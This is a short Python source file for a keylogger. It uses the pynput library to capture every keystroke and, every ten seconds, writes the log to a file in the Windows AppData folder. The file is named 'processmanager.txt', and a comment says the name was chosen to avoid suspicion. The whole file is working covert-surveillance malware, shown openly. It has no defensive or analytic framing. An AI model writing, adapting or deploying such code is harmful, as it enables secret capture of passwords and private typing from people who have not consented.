#!/usr/bin/python

import pynput.keyboard
import threading
import os

log = ""
path = os.environ["appdata"] + "\\processmanager.txt"
#saving file such that it is not suspicious with backdoor

def process_keys(key):
	global log
	try:
		log = log + str(key.char)
	except AttributeError:
		if key == key.space:
			log = log + ""
		elif key == key.right:
			log = log + ""
		elif key == key.left:
			log = log + ""
		elif key == key.up:
			log = log + ""
		elif key == key.down:
			log = log +""
		else:
			log = log + "" + str(key) + ""

#	print(log)
#	print(key)
#	with open("log.text","a") as fin:
#		fin.write(str(key))


def report():
	global log
	global path
	fin = open(path, "a")
	fin.write(log)
	log = ""
	fin.close()
	timer = threading.Timer(10,report)
	timer.start()


def start():
	keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
	with keyboard_listener:
		report()
		keyboard_listener.join()
